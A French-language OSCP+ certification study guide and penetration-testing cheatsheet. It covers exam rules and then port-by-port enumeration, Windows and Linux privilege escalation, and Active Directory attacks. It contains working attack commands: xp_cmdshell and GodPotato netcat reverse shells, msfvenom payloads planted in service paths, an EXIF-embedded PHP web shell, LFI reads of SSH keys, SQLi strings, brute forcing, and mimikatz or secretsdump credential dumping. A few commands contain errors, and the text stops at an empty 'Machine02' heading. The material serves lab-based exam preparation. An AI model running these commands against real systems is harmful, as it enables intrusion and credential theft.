title: "Guide Complet pour la Certification OSCP+"
date: 2025-04-22 00:00:00 +8000
categories: [Certifications, Offensive Security, Cheatsheet]
tags: []
description: A concise OSCP cheatsheet offering essential tools, techniques, and commands for efficient penetration testing, privilege escalation, and exploitation.
image:
  path: images/oscp-logo.png
  alt: OSCP 
# Guide Complet pour la Certification OSCP+

# 🏆 Préparation à l'OSCP

1. 📝 Guide OSCP  
    1. Introduction  
    2. Structure de l'examen  
    3. Exigences de l'examen  
        1. Documentation  
        2. Code d'exploitation  
        3. Règles de documentation  
        4. Restrictions de l'examen  
    4. Connexion à l'examen  
    5. Panneau de contrôle de l'examen  
    6. Soumission du rapport  
    7. Résultats  


# **Guide de l'examen de certification OSCP+**

## **📑 Introduction**

L'examen OSCP+ simule un réseau réel à l'intérieur d'un VPN privé avec plusieurs machines vulnérables. Vous disposez de **23 heures et 45 minutes** pour terminer l'examen. Après cela, vous aurez **24 heures** supplémentaires pour télécharger votre documentation.

Tous les examens sont **surveillés**. Consultez le manuel de surveillance et la FAQ ici :  
https://help.offsec.com/hc/en-us/sections/360008126631-Proctored-Exams

## **🔧 Structure de l'examen**

### **Score total : 100 points (minimum 70 pour réussir)**

1. **3 machines autonomes (60 points au total)**  
    - 20 points par machine :  
        - 10 points pour l'accès initial  
        - 10 points pour l'élévation de privilèges  
2. **1 ensemble Active Directory (AD) avec 3 machines (40 points au total)**  
    - On vous donne un utilisateur et un mot de passe initiaux, simulant un scénario de violation.  
    - Notation :  
        - 10 points pour la machine 1  
        - 10 points pour la machine 2  
        - 20 points pour la machine 3  

### **Exemples de combinaisons réussies :**

- 40 points en AD + 3 drapeaux `local.txt` (70 points)  
- 40 points en AD + 2 `local.txt` + 1 `proof.txt` (70 points)  
- 20 points en AD + 3 `local.txt` + 2 `proof.txt` (70 points)  
- 10 points en AD + 3 machines autonomes entièrement compromises (70 points)  

**🔄 Ordre d'évaluation :**  
L'ordre dans lequel vous documentez les machines dans votre rapport détermine leur ordre d'évaluation.

## **📝 Exigences de l'examen**

### **📚 Documentation**

Vous devez rédiger un rapport professionnel détaillant le processus d'exploitation pour chaque cible.

Doit inclure :

- Toutes les commandes exécutées  
- Captures d'écran montrant `local.txt` et `proof.txt`  
- Sortie du shell montrant l'adresse IP cible  
- Instructions étape par étape qui peuvent être reproduites  

### **📋 Code d'exploitation**

Si vous avez utilisé un exploit non modifié, **fournissez uniquement l'URL**. Si modifié, incluez :

- Le code modifié  
- L'URL de l'exploit original  
- Les commandes de génération de shellcode (le cas échéant)  
- Explication des modifications  

### **🎨 Règles de documentation**

- Tous les drapeaux `local.txt` et `proof.txt` doivent être affichés dans des captures d'écran avec l'IP visible  
- Utilisez un **shell interactif** (`cat` ou `type`) pour afficher les drapeaux  
- Sous Windows, vous devez être `SYSTEM`, `Administrator`, ou un utilisateur de niveau administrateur  
- Sous Linux, vous devez être `root`  

### **🔒 Restrictions de l'examen**

Non autorisés :

- **Outils d'exploitation automatisés** (SQLmap, Nessus, Metasploit Pro, etc.)  
- **Usurpation** (ARP, DNS, NBNS, etc.)  
- **IA ou chatbots** (ChatGPT, OffSec KAI, etc.)  
- **Téléchargement de fichiers depuis l'environnement d'examen**  

**Metasploit** ne peut être utilisé que sur **une seule machine**, et pas pour le pivoting.

Outils autorisés : `Nmap`, `Nikto`, `Burp Free`, `DirBuster`, entre autres.

## **💻 Connexion à l'examen**

1. **Téléchargez le pack de connexion** depuis le lien dans votre e-mail d'examen  
2. **Extrayez les fichiers :**

    ```bash
    tar xvfj exam-connection.tar.bz2
    ```

3. **Connectez-vous au VPN avec OpenVPN :**

    ```bash
    sudo openvpn OS-XXXXXX-OSCP.ovpn
    ```

4. **Entrez le nom d'utilisateur et le mot de passe fournis dans l'e-mail**

## **🛠️ Panneau de contrôle de l'examen**

Depuis le panneau, vous pouvez :

- Soumettre des drapeaux  
- Réinitialiser les machines (jusqu'à 24 réinitialisations, réinitialisables une fois)  
- Voir les objectifs spécifiques de chaque machine  

## **📃 Soumission du rapport**

**Liste de contrôle de soumission :**

- Format PDF nommé **`OSCP-OS-XXXXX-Exam-Report.pdf`**  
- Archive compressée `.7z` sans mot de passe : **`OSCP-OS-XXXXX-Exam-Report.7z`**  
- Taille maximale : **200MB**  
- Téléchargement à : [**https://upload.offsec.com**](https://upload.offsec.com/)  
- Vérifiez le hachage MD5 après le téléchargement  

**Commandes pour générer et vérifier :**

```bash
sudo 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
md5sum OSCP-OS-XXXXX-Exam-Report.7z
```

## **Résultats**  

Vous recevrez vos résultats par e-mail dans les 10 jours ouvrables.

Si des informations supplémentaires sont requises, vous devez les fournir dans les 24 heures suivant la demande.
Pour les problèmes techniques pendant l'examen, contactez :
Chat en direct : https://chat.offsec.com

E-mail : help@offsec.com

## **🎯 Liste des machines**  

https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#
https://docs.google.com/spreadsheets/u/0/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/htmlview#

## Le Cours PEN-200
PEN-200 est un cours pratique d'auto-formation en pentesting qui vise à enseigner l'état d'esprit, les compétences et les outils nécessaires pour développer de solides compétences fondamentales en pentesting pour les professionnels de la sécurité informatique.

## L'Examen de Certification OSCP+
L'examen est une évaluation pratique qui teste la capacité de l'étudiant à obtenir un accès non autorisé à plusieurs systèmes présentés dans un délai imparti. La structure actuelle de l'examen surveillé est la suivante :

- **Durée de l'examen pratique** : 24 heures
- **Objectif** : Exploiter jusqu'à 6 machines en obtenant au moins 70 points sur 100
  - 3 machines indépendantes, chacune valant 20 points (10 points pour l'accès au niveau utilisateur, 10 points pour l'accès au niveau système/root)
  - 1 ensemble Active Directory valant 40 points (2 clients, 1 contrôleur de domaine)
    - Machine 01 (10 points) | Machine 02 (10 points) | DC 01 (20 points)
- **Délai pour le rapport d'examen** : 24 heures

Les étudiants doivent soumettre un rapport dans les 24 heures suivant l'évaluation pratique, détaillant toutes les techniques d'exploitation utilisées pendant l'examen. Un rapport incomplet entraînera 0 point pour les machines associées.


## Plateformes
1. Pour l'accès initial, travailler sur eJPT, cet article et le contenu officiel
2. Pour l'élévation de privilèges Windows, utiliser TCM Security, le contenu officiel et les vidéos YouTube  
   https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners
3. Pour l'élévation de privilèges Linux, utiliser TCM Linux, le contenu officiel et les vidéos YouTube  
   https://academy.tcm-sec.com/p/linux-privilege-escalation
4. Pour Active Directory, utiliser le contenu officiel, cet article et rechercher plus de contenu

## Plateformes de Labs
L'un des meilleurs choix pour un lab est Tjnull, qui comprend des machines de Hack The Box, TryHackMe, Proving Grounds (pratique), et les labs officiels d'OffSec pour s'entraîner.

https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#

Lorsque vous achetez l'OSCP+, vous recevez un abonnement de 3 mois qui inclut différents labs, à savoir Secura, OSCP A, OSCP B, OSCP C, Relia, Medtech et Skylark, totalisant 66 labs. Il existe différentes approches pour résoudre ces machines. J'ai commencé par OSCP A, B, C, puis j'ai poursuivi avec Medtech, Relia, Skylark et Secura. Ils ont actuellement deux labs supplémentaires, Zeus et Poseidon, qui ne sont pas inclus dans le programme OSCP+. Cependant, si vous souhaitez acquérir une expérience pratique et vous préparer efficacement à l'OSCP+, ces labs peuvent apporter des avantages significatifs.

## Recommandations pour OSCP+
J'ai divisé le contenu en quatre sections différentes avec les titres suivants :

## 1. Accès Initial avec Différents Ports

### Général :
- Si vous trouvez des identifiants, utilisez les ports 21, 22, 3389, les pages de connexion web (ports d'écoute HTTP), le port 161 (evil-winram) et les bases de données.
- Essayez d'abord une approche à accès élevé, ciblant les systèmes avec des droits élevés comme RDP et SSH.
- Vérifiez toujours le répertoire /.ssh/ pour les clés RSA et les clés autorisées.

### Nmap
```bash
autorecon <ip>  # (meilleur outil avec scan UDP et TCP, vous ne voulez pas utiliser -sU -sT)
nmap -A -Pn <ip> # (Meilleure commande Nmap pour l'accès initial)
nmap -sC -sV -A -T4 -Pn -o 101.nmap 192.168.10.10  # (* vérifiez toujours la version pour chaque port vsftp 3.02 exploitable, cherchez sur Google ou searchsploits)
Test-NetConnection -Port 445 192.168.10.10 # (vérifiez si 445 est activé)
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $)) "TCP port $ is open"} 2>$null # (vérifiez les ports 1 à 1024) (pour Windows)
nmap -sC -A -p21 <ip> # (pour un port spécifique)
```

### Port 21 FTP :
Il y a un nom d'utilisateur et un mot de passe sur celui-ci, vous pouvez télécharger un shell sur le répertoire ou trouver des fichiers téléchargés pour l'accès initial.

```bash
nmap --script=ftp-* -p 21 $ip  # (scan complet du port FTP)
# vérifiez si l'anonyme est autorisé, puis utilisez ftp anonymous@ip (mot de passe également anonymous)
# il y a un certain mode, si la commande ls dir ne fonctionne pas, alors appliquez "use passive" (pour passer en mode actif)
mget * # Téléchargez tout du répertoire actuel comme zip, pdf, doc
send/put # Envoyez un fichier unique ou téléchargez une commande shell
# après avoir téléchargé des fichiers, utilisez toujours exiftool –u -a <filename> (description Meta pour les utilisateurs)
# La version FTP supérieure à 3.0 n'est pas exploitable
```

### Port 22 SSH :
Vous ne pouvez pas obtenir un accès initial directement, cependant, nous pouvons nous connecter avec un utilisateur, un mot de passe et une clé privée.

```bash
ssh noman@ip
ssh -p 2222 noman@192.168.10.10 # (ssh avec un port différent)
curl http://<ip>/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa -p 2222 noman@ip
user/.ssh/authorized_key
```

### PORT 25 (serveur relais à serveur) 465 (client mail à serveur)
Vous pouvez envoyer un email de phishing avec ce port pour obtenir un shell inversé.
Utilisé pour envoyer, recevoir et relayer les emails sortants. Les principales attaques sont l'énumération des utilisateurs et l'utilisation d'un relais ouvert pour envoyer du spam.

```bash
nmap 192.168.10.10 --script=smtp* -p 25
# toujours se connecter avec telnet <ip> 25
```

### Port 53 DNS :
Énumération générale pour domaine pour trouver nom d'hôte et sous-domaine, etc.

```bash
nslookup <ip> | Dig <ip> | Host <ip> | host -t ns $ip | # sous-domaines, hôte, ip
dnsenum
```

### Port 80, 8080, 443 :
Lors de l'exécution de Nmap, vous pouvez découvrir des ports HTTP comme 80, 81, 8080, 8000, 443, etc. Il est possible de trouver quatre ports HTTP sur une machine.

Dans la toute première étape, exécutez Nmap avec un scan agressif sur tous les ports :

```bash
nmap -sC -sV -A -T4 -Pn -p80,81,8000,8080,443 192.168.146.101
```

Copiez simplement le nom de la version du site Web et recherchez sur Google pour trouver une exploitation.

De plus, Nmap révèle certains fichiers tels que robots.txt, index.html, index.php, login.php, cgi-sys, cgi-mod et cgi-bin.

Si vous rencontrez une erreur d'hôte, trouvez un nom d'hôte avec le port 53 ou découvrez un nom dans le code source du site Web, le pied de page, le contact, etc.

Ensuite, ajoutez ce domaine découvert dans le fichier /etc/hosts pour accéder au site.

### Découverte de Contenu :
```bash
gobuster dir -u http://192.168.10.10 -w /wd/directory-list-2.3-big.txt # (exécution simple)
gobuster dir -u http://192.168.10.10:8000 -w /wd/directory-list-2.3-big.txt # (avec un port différent)
gobuster dir -u http://192.168.10.10/noman -w /wd/directory-list-2.3-big.txt # (si vous trouvez noman, énumérez le répertoire noman)
```

À l'aide de la découverte de contenu, vous trouverez des répertoires cachés, des connexions web CMS, des fichiers, etc. C'est une étape cruciale dans l'OSCP+.
En utilisant la découverte de contenu et Nmap, vous pouvez identifier les CMS, les pages statiques, les sites Web dynamiques et les fichiers importants tels que les bases de données, .txt, .pdf, etc. De plus, vous pouvez énumérer les sites Web avec des outils automatisés tels que WPScan, JoomScan, Burp Suite, et découvrir des vulnérabilités Web comme RCE, SQLi, fonctionnalité de téléchargement, XSS, etc.
Si vous trouvez un CMS comme WordPress, Joomla, etc., recherchez simplement sur Google les identifiants par défaut ou les exploits de thème, plugin, version, etc. Dans le cas d'une page de connexion, vous pouvez exploiter l'injection SQL et lancer une attaque par force brute avec Hydra. Si vous identifiez un CMS, scannez-le avec des outils, effectuez une énumération par force brute, vérifiez les noms d'utilisateur et mots de passe par défaut, explorez les thèmes, les plugins, les exploits de version, et recherchez sur Google. Alternativement, vous pouvez découvrir des vulnérabilités Web pour obtenir un accès initial.

### WPScan
```bash
wpscan --url http://10.10.10.10 --enumerate u
wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN
wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt
wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt
```

### Drupal
```bash
droopescan scan drupal -u http://example.org/ -t 32
find version > /CHANGELOG.txt
```

### Adobe Cold Fusion
```bash
# vérifier la version /CFIDE/adminapi/base.cfc?wsdl
# fckeditor Version 8 LFI > http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

### Elastix
- Recherchez les vulnérabilités sur Google
- Les identifiants par défaut sont admin:admin à /vtigercrm/
- Possibilité de télécharger un shell dans la photo de profil

### Joomla
- Page d'administration - /administrator
- Fichiers de configuration : configuration.php | diagnostics.php | joomla.inc.php | config.inc.php

### Mambo
- Fichiers de configuration >> configuration.php | config.inc.php

### Page de connexion
- Essayez des identifiants communs tels que admin/admin, admin/password et falafel/falafel.
- Déterminez si vous pouvez énumérer les noms d'utilisateur en fonction d'un message d'erreur verbeux.
- Testez manuellement l'injection SQL. Si cela nécessite une injection SQL plus complexe, exécutez SQLMap dessus.
- Si tout échoue, exécutez hydra pour forcer les identifiants.
- Afficher le code source
- Utiliser le mot de passe par défaut
- Brute force le répertoire d'abord (parfois, vous n'avez pas besoin de vous connecter pour exploiter la machine)
- Rechercher des identifiants par bruteforce du répertoire
- Brute force des identifiants
- Rechercher des identifiants dans un autre port de service
- Énumération pour les identifiants
- S'inscrire d'abord
- Injection SQL
- XSS peut être utilisé pour obtenir le cookie administrateur
- Brute force du cookie de session

### Vulnérabilités Web :
#### SQLi :
- Antisèche Pentestmonkey
- Essayez admin'# (nom d'utilisateur valide, voir antisèche netsparker sqli)
- Essayez abcd' or 1=1;--
- Utilisez UNION SELECT null,null,.. au lieu de 1,2,.. pour éviter les erreurs de conversion de type
- Pour mssql :
  - xp_cmdshell
  - Utilisez concat pour lister 2 données de colonne ou plus en une
- Pour mysql :
  - essayez a' or 1='1 -- -
  - A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'

#### Upload de fichier :
- Changer le type MIME
- Ajouter des en-têtes d'image
- Ajouter une charge utile dans le commentaire exiftool et nommer le fichier comme file.php.png
- ExifTool 1. <?php system($_GET['cmd']); ?> //shell.php 2. exiftool "-comment<=shell.php" malicious.png 3. strings malicious.png | grep system

#### Utilisez un outil automatisé
```bash
nikto # nikto -h $ip
nikto -h $ip -p 80,8080,1234 # test de différents ports avec un scan
```

#### Git
Télécharger .git
```bash
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
# Extraire le contenu .git
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
```

#### LFI et RFI
Si LFI est trouvé, commencez par :
```bash
../../../../etc/passwd
# Les clés SSH sont
# Par défaut, SSH recherche id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, et id_dsa
curl http://rssoftwire.com/noman/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa
# avec encodage
curl http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

#### Énumération SSL
```bash
# Ouvrez une connexion
openssl s_client -connect $ip:443
```

### Port 161 UDP :
Cela vous donnera le nom d'utilisateur, le mot de passe ou tout indice pour la connexion.

```bash
# Il sera obtenu avec autorecon (Port UDP)
nmap -sU -p161 --script "snmp-*" $ip
nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP
snmpwalk -v 1 -c public 192.168.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull # (c'est la commande que j'ai utilisée dans 2-3 machines pour trouver nom d'utilisateur, mot de passe ou indice d'utilisateur et de passe)
evil-winrm -I 192.168.10.10 -u 'noman' -p 'nomanpassword' # (connexion avec cette commande)
```

### PORT 139, port 445 (également PORT 137 (services de noms) & PORT 138 (datagram) UDP netbios)
Vérifiez toujours la connexion invité, puis vérifiez le partage public avec permission d'écriture et d'exécution, et vous trouverez des identifiants, des fichiers pdf ps1, etc.

```bash
nmap -v -script smb-vuln* -p 139,445 10.10.10.10
smbmap -H 192.168.10.10 # (partages publics) (vérifier lecture, écriture et exécution)
smbmap -H 192.168.10.10 -R tmp # (vérifier un dossier spécifique comme tmp)
enum4linux -a 192.168.10.10 # (meilleure commande pour trouver des détails et des listes d'utilisateurs)
smbclient -p 4455 -L //192.168.10.10/ -U noman --password=noman1234
smbclient -p 4455 //192.168.10.10/scripts -U noman --password noman1234 # (connexion)
```

### Port 3389 RDP
Il existe deux méthodes pour ce port : l'une consiste à trouver des identifiants avec un autre port, et l'autre emploie la force brute.

Il n'existe qu'une seule méthode pour trouver des identifiants sur ce port, qui implique une attaque par force brute utilisant Hydra.
```bash
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
# puis connexion avec xfreerdp
xfreerdp /v:noman /u:passwordnoman /p:192.168.10.10 /workarea /smart-sizing
rdesktop $ip
```

### PORT 3306 MySQL
Trouvez des identifiants avec un autre port et utilisez les valeurs par défaut pour vous connecter.

```bash
nmap -sV -Pn -vv -script=mysql* $ip -p 3306
mysql -u root -p 'root' -h 192.168.10.10 -P 3306
select version(); | show databases; | use database | select * from users; | show tables | select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre
```

### MSSQL 1433, 4022, 135, 1434, UDP 1434
Pour ce port, vous pouvez trouver des identifiants à partir d'un autre port et vous connecter avec ipacket-mssqlclient.

```bash
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
impacket-mssqlclient noman:'Noman@321@1!'@192.168.10.10
impacket-mssqlclient Administrator: 'Noman@321@1!'@192.168.10.10 -windows-auth
SELECT @@version; | SELECT name FROM sys.databases; | SELECT FROM offsec.information_schema.tables; | select from offsec.dbo.users;
```

#### Connecter en tant que CMD database
```sql
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
EXEC xp_cmdshell 'whoami';
exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o \windows\temp\nc.exe"';
exec xp_cmdshell 'cmd /c dir \windows\temp';
exec xp_cmdshell 'cmd /c "\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';
# également appliqué sur la connexion SQL Injection
```

### PORT 5437 & PORT 5432 PostgreSQL
Si vous trouvez ce port, suivez les commandes ci-dessous, et vous pouvez également facilement trouver des identifiants à partir d'un autre port.
```bash
5437/tcp open postgresql PostgreSQL DB 11.3 - 11.7
msf6 exploit(linux/postgres/postgres_payload) > options et définir toutes les valeurs rhost lhost port LHOST tun0
OU | psql -U postgres -p 5437 -h IP | select pg_ls_dir('./'); | select pg_ls_dir('/etc/password'); | select pg_ls_dir('/home/wilson'); | select pg_ls_dir('/home/Wilson/local.txt');
```

## 2. Élévation de Privilèges Windows
J'ai utilisé cette approche :

- Exécutez whoami /all (si activé, utilisez printspoofer ou got potato).
- Exécutez simplement PowerUp, puis trouvez des privilèges sur DLL non cité, etc.
- Téléchargez WinPEAS pour une énumération plus approfondie si ce qui précède ne fonctionne pas. WinPEAS trouve principalement des mots de passe en clair.
- Enfin, trouvez n'importe quel exécutable (exe), script PowerShell (ps1) ou fichier PDF en cours d'exécution. Exécutez-le pour une énumération plus approfondie et recherchez sur Google pour plus de détails.

### Upload
```bash
certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1 # (exécuter uniquement sur cmd)
iwr -uri http://192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 # (power shell)
curl 192.168.10.10/PowerUp.ps1 -Outfile PowerUp.ps1 # (les deux)
# Démarrer le serveur http avec python3 -m http.server 80 ou 81 etc
```

### Mot de passe en clair
- Noms de dossiers : Dossier C | Dossier Document
- Pour trouver un mot de passe
  - exécuter winpeas
  - vérifier l'historique avec la commande
  - vérifier les fichiers exe dans C ou le bureau, etc.
  - \users\noman\documents\fileMonitorBackup.log

### Permissions de fichier
F> Accès complet | M> Accès de modification | RX> Accès en lecture et exécution | R> Accès en lecture seule | W> Accès en écriture seule

```bash
icacls "C:\xampp\apache\bin\fida.exe" # (vérifier les permissions)
```

### Outils automatisés
#### Powerup
```bash
certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks # (vérifiez toutes les vulnérabilités possibles sauf passwd en clair)
```

#### Winpeas.exe (tout, y compris passwd en clair)
```bash
# Windpeas.exe Si .net 4.5 (exécutez sinon)
certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
.\winPEASx64.exe
```

### Énumération manuelle
```bash
Systeminfo # OU systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Hostname | Whoami | wmic qfe # (mises à jour et correctifs, etc.)
Wmic logicaldisk # (lecteurs)
echo %USERNAME% || whoami # puis $env:username
Net user | net user noman
Net localgroup | net localgroup noman
netsh firewall show state # (pare-feu)
Whoami /priv
Ipconfig | ipconfig /all
netstat -ano | route print
Powershell | Get-LocalUser | Get-LocalGroup | Get-LocalGroupMember Administrators
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # (vérifier le logiciel avec version 32 bits et ci-dessous 64)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
# Si RDP est activé ou que nous l'activons, ajoutez ceci
net localgroup administrators /add
# Installation Windows sans surveillance (anciens fichiers d'utilisateur et de passe puis crack)
dir /s sysprep.inf sysprep.xml unattended.xml unattend.xml *unattended.txt 2>null
```

### Mine d'Or Mot de passe/texte en clair

#### 1ère Technique (Mot de passe commun)
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
- Emplacement lisible |
  ```bash
  findstr /si password .txt | .xml | *.ini
  ```
- Registre | (SI VNC installé)
  ```bash
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # (autologin)
  ```
- Configuration | fichiers avec winpeas
- SAM | winpeas (recherche de sauvegardes communes Sam et System)
- Machine attaquante déplace puis décrypte avec l'outil creddump-master
  ```bash
  ./pwdump.py SYSTEM SAM
  ```
- OU
  ```bash
  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue # (rechercher un fichier de sauvegarde)
  Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue # (vérifier les fichiers) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
  Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue # (vérifier doc txt etc)
  ```
- Une autre mine d'or powershell
  ```bash
  Get-History | (Get-PSReadlineOption).HistorySavePath # (fichier trouvé puis type noman.txt et si commande trouvée, faites-le à cause du root)
  cd C:\ | pwd | dir
  ```

### SeImpersonatePrivilege activé
```bash
Whoami /priv et Whoami /all
```

#### Printspoofer
```bash
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd # OU .\PrintSpoofer32.exe -i -c powershell.exe
```

#### GODpotato
```bash
curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe
.\god.exe -cmd "cmd /c whoami" # OU
curl 192.168.10.10:8081/nc.exe -o nc.exe
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"
.\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e powershell"
```

### Exploits du noyau
#### Service Biopath modifiable
```bash
Get-ModifiableServiceFile
# Vérification des permissions et vérification de l'arrêt/démarrage du service
# Msfvenom créer shell et télécharger (curl, iwr, certutil)
icacls "C:\Program Files"
msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
del "C:\program files\noman\noman.exe"
curl 192.168.10.10/rev.exe -o noman.exe
cp noman.exe "C:\program files\noman\"
net start noman
```

#### Chemin non cité
```bash
Get-UnquotedService
# Vérification des permissions et vérification de l'arrêt/démarrage du service
# Msfvenom créer shell et télécharger (curl, iwr, certutil)
icacls "C:\Program Files"
msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe
del "C:\program files\noman\noman.exe"
curl 192.168.10.10/rev.exe -o noman.exe
cp noman.exe "C:\program files\noman\"
net start noman
```

#### Détournement de DLL
```bash
# Vérification des permissions et vérification de l'arrêt/démarrage du service
# Msfvenom créer shell et télécharger (curl, iwr, certutil)
icacls "C:\Program Files"
msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll
del "C:\program files\noman\noman.dll"
curl 192.168.10.10/rev.dll -o noman.dll
cp noman.dll "C:\program files\noman\"
net start noman
```

#### Planificateur de tâches/travail cron
```bash
schtasks /query /fo LIST /v # (rechercher taskName: \Microsoft\CacheCleanup)
icacls C:\Users\noman\Pictures\Cleanup.exe # permission utilisateur (I)(F) requise)
iwr -Uri http://192.168.10.10/adduser.exe -Outfile Cleanup.exe
move .\Pictures\BackendCacheCleanup.exe Cleanup.exe.bak
move .\Cleanup.exe .\Pictures\ # (attendre l'exécution et mettre le fichier juste un avant le dossier)
```

## 3. Élévation de Privilèges Linux
Commencez par des outils automatisés comme LinPEAS, puis procédez à une énumération manuelle. La commande suivante est utilisée pour obtenir un shell TTY
```bash
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])' # --> shell d'accès complet
```

### Outils automatisés
```bash
python -m http.server 80
wget http://192.168.10.10/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh | ./linpeas.sh | ( ./linpeas.sh | tee filename.txt )
```

### Énumération manuelle
Approche vérificateur de permission/cron job/
```bash
cmd: ls -la /etc/passwd/ | ls -la /etc/shadow # --> vérifier les permissions de lecture/écriture | sudo su
sudo -l # (https://gtfobins.github.io/#)
find / -user root -perm -4000 -print 2>/dev/null
getcap -r / 2>/dev/null # (capabilities)(cap_setuid+ep)
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm 0777 | find / -writable -type d 2>/dev/null
cat /etc/crontab # (normal) | grep "CRON" /var/log/syslog # (wildcarts)
history | cat .bashrc
```

### Mine d'Or Mot de passe/texte en clair
- Fichiers de sauvegarde
- Recherche de noyau avec Google

## 4. Active Directory
Active Directory est un défi pour tout le monde. Avec les identifiants fournis, exécutez simplement un scan Nmap pour énumérer les services et les ports ouverts. Utilisez les résultats du scan pour déterminer où appliquer efficacement les identifiants en fonction des services identifiés. Il y a trois machines différentes : Machine01, Machine02, Domain01. La machine Machine01 commence toujours par un accès initial et une élévation de privilèges en tant que machine autonome. Veuillez utiliser les étapes suivantes pour travailler sur Active Directory :

1. Exécutez net user /domain.
2. Listez les utilisateurs et exécutez sharpHound.ps1 pour trouver les utilisateurs du domaine (autrement pas dans la liste des utilisateurs) ainsi qu'avec les étapes ci-dessous.
3. Exécutez secretdumps, et si vous venez d'un shell inversé, changez alors le mot de passe administrateur.
4. Pour le tunneling (utilisez Chisel ou exécutez avec SSH), s'il y a un problème, restaurez la machine.
5. Trouvez l'utilisateur et le mot de passe à partir de secretdumps, mimikatz lecteur c, fichiers de configuration, winpeas, etc.
6. Vérifiez les services avec des ports ouverts tels que 22, 1433, 5896, 5895, 445, etc.
7. Utilisez CrackMapExec avec l'utilisateur et le mot de passe, en testant avec les services ci-dessus.
8. Effectuez AS-REP Roasting avec GetUserSPN.py ou Rubeus.exe.
9. Si SQL, utilisez mssqlclient.py ; si SMB, utilisez psexec.py ; si WinRM ou evil-winrm, vérifiez l'administrateur, puis passez à l'étape suivante pour trouver le root Windows.
10. Pour Domain01 :
11. Exécutez secretsdump (Administrateur par défaut) avec utilisateur, passe ou hash, de même avec psexec, winrm, SSH, etc.
12. Directement rooted.

### Machine01
Après avoir obtenu l'élévation de privilèges, exécutez les commandes suivantes :

```bash
# Transférer SharpHound.ps1 vers la cible & charger dans powershell ::
. . \SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
# Utilisateurs trouvés compte domain01 (si vous trouvez un utilisateur, n'utilisez pas l'étape ci-dessous)
# transférer bloodhound.zip sur kali
# Créer un nouvel utilisateur (si vous voulez ou changer le mot de passe administrateur)
net user noman Noman@321 /add
net localgroup administrators noman /add
net user administrator Noman@123 # (mot de passe changé de l'administrateur)
# exécuter secret dump ou utiliser mimikatz pour trouver utilisateur et mot de passe sur machine01
# utiliser impacket pour secret dump https://github.com/fortra/impacket
python3 ./secretsdump.py ./administrator: Noman@123@192.168.10.10 # (vérifier les utilisateurs du domaine avec noman.domain spécialement nom d'utilisateur et mot de passe par défaut
# pour MimiKatz privilege::debug | token::elevate | sekurlsa::logonpasswords
```

### Machine02
